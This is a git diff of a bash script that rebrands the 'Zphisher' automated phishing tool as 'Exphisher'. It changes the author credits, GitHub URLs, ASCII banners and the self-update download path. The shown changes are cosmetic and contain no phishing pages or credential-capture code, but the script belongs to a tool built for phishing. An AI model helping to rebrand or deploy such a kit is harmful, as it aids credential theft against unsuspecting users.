@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Exphisher 	: 	Automated Phishing Tool
+##   Author 	: 	Sangeet Solanki 
 ##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Github 	: 	https://github.com/sangeet0611/Ex-Phisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -164,9 +164,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	relase_url='https://api.github.com/repos/sangeet0611/Ex-Phisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/sangeet0611/Ex-Phisher/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -174,15 +174,15 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".exphisher.tar.gz" "${tarball_url}"
 
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		if [[ -e ".exphisher.tar.gz" ]]; then
+			tar -xf .exphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
+			rm -f .exphisher.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run exphisher again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
@@ -202,30 +202,32 @@ check_status() {
 
 ## Banner
 banner() {
-	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+    cat <<- EOF
+        ${ORANGE}
+        ${ORANGE}  _______  ______  _   _ ___ ____  _   _ _____ ____  
+        ${ORANGE} | ____\ \/ /  _ \| | | |_ _/ ___|| | | | ____|  _ \ 
+        ${ORANGE} |  _|  \  /| |_) | |_| || |\___ \| |_| |  _| | |_) |
+        ${ORANGE} | |___ /  \|  __/|  _  || | ___) |  _  | |___|  _ < 
+        ${ORANGE} |_____/_/\_\_|   |_| |_|___|____/|_| |_|_____|_| \_\
+        ${ORANGE}                       ${RED}Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
-	EOF
+        ${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Sangeet Solanki${WHITE}
+    EOF
 }
 
 ## Small Banner
 banner_small() {
-	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
-	EOF
+    cat <<- EOF
+        ${BLUE}
+         ${BLUE}  _______  ______  _   _ ___ ____  _   _ _____ ____  
+        ${BLUE} | ____\ \/ /  _ \| | | |_ _/ ___|| | | | ____|  _ \ 
+        ${BLUE} |  _|  \  /| |_) | |_| || |\___ \| |_| |  _| | |_) |
+        ${BLUE} | |___ /  \|  __/|  _  || | ___) |  _  | |___|  _ < 
+        ${BLUE} |_____/_/\_\_|   |_| |_|___|____/|_| |_|_____|_| \_\
+        ${BLUE}                             ${WHITE} ${__version__}
+    EOF
 }
+
 
 ## Dependencies
 dependencies() {
@@ -349,9 +351,8 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Author   ${RED}:  ${ORANGE}SANGEET SOLANKI ${RED}[ ${ORANGE}sangeet0611 ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/sangeet0611
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
